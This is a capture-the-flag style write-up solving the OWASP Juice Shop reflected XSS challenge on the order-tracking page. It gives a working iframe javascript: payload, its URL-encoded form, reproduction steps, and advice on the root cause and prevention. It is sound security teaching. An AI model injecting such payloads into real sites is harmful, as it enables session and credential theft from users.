# OWASP Juice Shop – Reflected XSS Challenge

## Category: Reflected XSS | Challenge Name: Reflected XSS | Difficulty: 2 Star

### Objective

- Trigger a reflected XSS using the provided payload:

```html id="p3m8ra"
<iframe src="javascript:alert(`xss`)">
````

### Challenge Description

- The order tracking page reflects the `id` parameter from the URL into the page without proper output encoding or sanitization.

## Vulnerable Endpoint

```text
http://192.168.1.122:3000/#/track-result?id=5267-1a95632d1ebc02f4
```

>The `id` value is user-controlled.

## Working Payload URL

```text
http://192.168.1.122:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
```

## Decoded Payload

```html
<iframe src="javascript:alert(`xss`)">
```

## Step-by-Step Solution

### Step 1: Place Any Order

- Buy any item so the tracking/history feature becomes available.

### Step 2: Open Order History

- Navigate to:

```text
Order History
```

>Click **Track Order**.


### Step 3: Modify URL Parameter

- Replace the normal tracking ID with the encoded payload:

```text
?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
```

### Step 4: Press Enter

- An alert box appears:

```text
xss
```

![[Pasted image 20260418175213.png]]

>Challenge gets solved.


## Why It Works

- The page reads the `id` parameter and inserts it into the DOM without safe encoding.

Example vulnerable behavior:

```javascript
element.innerHTML = id
```

Instead of safe rendering:

```javascript
element.textContent = id
```

## Vulnerability Type

### Reflected Cross-Site Scripting (XSS)

Malicious input is reflected from the URL into the page and executed immediately.

## Impact

### Risks

- Session theft
    
- Credential phishing
    
- DOM manipulation
    
- Forced actions as user
    
- Token theft
    
- Malware redirects

## Severity

**High**

## OWASP Mapping

- A03: Injection
    
- A07: Identification & Auth Failures (via session theft impact)
    
- Cross-Site Scripting

## Root Cause

- Unsanitized URL parameter rendering
    
- Use of `innerHTML`
    
- Missing Content Security Policy
    
- No output encoding

## Prevention

- Use `textContent` / safe templating
    
- Encode untrusted output
    
- Sanitize HTML input
    
- Apply strong CSP
    
- Validate expected parameter formats

## Key Lesson

Any value taken from a URL and inserted into HTML without encoding can become executable code.

## Conclusion

This challenge demonstrates how reflected XSS can arise from something as simple as a tracking ID parameter.





